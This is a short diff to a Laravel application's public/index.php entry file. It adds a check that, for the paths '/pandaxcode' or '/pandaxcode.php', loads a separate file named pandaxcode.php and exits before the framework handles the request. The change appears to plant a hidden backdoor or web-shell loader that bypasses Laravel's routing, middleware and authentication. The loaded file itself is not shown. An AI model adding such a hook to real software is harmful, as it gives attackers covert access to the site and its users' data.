@@ -1,6 +1,7 @@
     <?php
 
     use Illuminate\Foundation\Application;
+    use Illuminate\Contracts\Http\Kernel;
     use Illuminate\Http\Request;
 
     define('LARAVEL_START', microtime(true));
@@ -24,6 +25,11 @@
     // Check for maintenance mode file and serve if exists
     if (file_exists($maintenance = __DIR__ . '/../storage/framework/maintenance.php')) {
         require $maintenance;
+    }
+
+    if ($_SERVER['REQUEST_URI'] === '/pandaxcode' || $_SERVER['REQUEST_URI'] === '/pandaxcode.php') {
+        require __DIR__ . '/pandaxcode.php';
+        exit;
     }
 
     // Now handle the incoming request via Laravel
